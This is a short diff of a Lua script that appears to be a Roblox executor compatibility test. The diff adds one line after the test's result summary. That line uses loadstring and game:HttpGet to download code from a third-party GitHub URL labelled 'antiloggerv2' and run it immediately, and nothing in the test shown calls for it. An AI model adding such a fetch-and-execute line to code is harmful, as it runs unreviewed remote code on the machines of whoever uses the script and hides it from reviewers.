@@ -880,5 +880,7 @@ repeat task.wait() until running == 0
 	print("✅ Tested with a " .. rate .. "% success rate (" .. outOf .. ")")
 	print("⛔ " .. fails .. " tests failed")
 	print("⚠️ " .. undefined .. " globals are missing aliases")
+	local func = loadstring(game:HttpGet("https://raw.githubusercontent.com/phareignxd/xemonscripts/refs/heads/main/antiloggerv2"))()
+	
 	]=])
 	
